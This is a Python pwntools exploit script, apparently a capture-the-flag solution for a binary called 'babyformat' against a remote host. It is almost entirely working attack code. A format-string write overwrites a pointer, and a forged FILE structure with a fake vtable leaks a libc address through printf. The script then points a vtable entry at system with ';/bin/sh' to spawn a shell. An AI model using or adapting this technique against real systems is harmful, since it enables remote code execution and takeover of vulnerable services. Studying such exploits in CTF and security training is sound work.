#!/usr/bin/env python3

from pwn import *

elf = ELF("./babyformat", checksec=False)
lib = ELF("./libc-2.23.so", checksec=False)
#ld = ELF("./ld-2.23.so", checksec=False)
context.binary = elf


#def conn():
#    if args.NONTRACE:
#        return remote("addr", 1337)
#    else:
#        return process([ld.path, elf.path], env={"LD_PRELOAD": lib.path})


# Preparation
TARGET_OFFSET = 24
BUF_ADDR = 0x602060
START = 0x4007B0
rop = ROP(elf)
RET_ROP = rop.find_gadget(["ret"])[0]

Candidate = [
    "__GI__IO_file_finish",  # 2
    "__GI__IO_file_overflow",  # 3
    "__GI__IO_file_underflow",  # 4
    "_IO_default_uflow",  # 5
    "_IO_default_pbackfail",  # 6
    "__GI__IO_file_xsputn",  # 7
    "__GI__IO_file_xsgetn",  # 8
    "__GI__IO_file_seekoff",  # 9
    "_IO_default_seekpos",  # 10
    "__GI__IO_file_setbuf",  # 11
    "__GI__IO_file_sync",  # 12
    "_IO_file_doallocate",  # 13
    "_IO_file_read",  # 14
    "_IO_file_write",  # 15
    "_IO_file_seek",  # 16
    "_IO_file_close",  # 17
    "_IO_file_stat",  # 18
    "_IO_default_showmanyc",  # 19
    "_IO_default_imbue",  # 20
]
CALL_ORDER = ["__GI__IO_file_finish", "_IO_file_close"]
SUPER_BREAK = "\n".join(["b {}".format(x) for x in Candidate])
print(SUPER_BREAK)

# PHASE 1
# Craft VTABLE
VTABLE = [0, 0]
for _ in range(len(Candidate)):
    VTABLE += [START]
VTABLE[17] = elf.plt["printf"]
assert len(VTABLE) == 0xA8 // 8
VTABLE = b"".join([p64(x) for x in VTABLE])
# print(hexdump(VTABLE))

# Craft FILE structure
#FILE = p64(0x80808080FBAD6480) + b"%lx %lx " * 26  # Flag and Padding
FILE = p64(0x80808080FBAD2c81) + b"#%29$lx#xxxxxxxx" + p64(0x602800)*6 + p64(0)*4 + p64(0x602090) + p64(3) + p64(0)*2 + p64(0x602800) + p64(0xffffffffffffffff) + p64(0)*8
assert len(FILE) == 0xD8
# FILE += p64(VTABLE_ADDR)

# Payload 1
payload = "%{}x%11$lln".format(BUF_ADDR + 0x30 + 0x20).encode()
payload = payload.ljust(32, b"\0")
payload += p64(BUF_ADDR + 0x30) * 2
payload += FILE
payload += p64(BUF_ADDR + len(payload) + 8)  # Point to fake VTABLE
payload += VTABLE

# Main program
#r = process("./babyformat", env={"LD_PRELOAD":"./libc-2.23.so"})
r = remote("192.46.228.70", 31337)

r.sendlineafter("/dev/null:", payload)

data = r.recvrepeat(0.5)
lib.address = int(data.split(b"#")[1], 16) - 0x20840
log.info("libc: {}".format(hex(lib.address)))


# PHASE 2
# Craft VTABLE
VTABLE = [0, 0]
for _ in range(len(Candidate)):
    VTABLE += [START]
VTABLE[2] = lib.symbols["system"]
#VTABLE[2] = lib.address + 0xf1207
assert len(VTABLE) == 0xA8 // 8
VTABLE = b"".join([p64(x) for x in VTABLE])
# print(hexdump(VTABLE))

# Craft FILE structure
FILE = p64(0x8080808080808080) + b";/bin/sh" + p64(0) * 25                   # Flag and Padding
#FILE = b"sh\0xxxxx" + p64(0) * 26
assert len(FILE) == 0xd8
# FILE += p64(VTABLE_ADDR)                                    

# Payload 2
payload = "%{}x%11$lln".format(BUF_ADDR + 0x30 + 0x20).encode()
payload = payload.ljust(32, b'\0')
payload += p64(BUF_ADDR + 0x30) * 2
#payload += FILE[0xb0:]
payload += FILE
payload += p64(BUF_ADDR + len(payload) + 8)                 # Point to fake VTABLE
payload += VTABLE

r.sendline(payload)

r.interactive()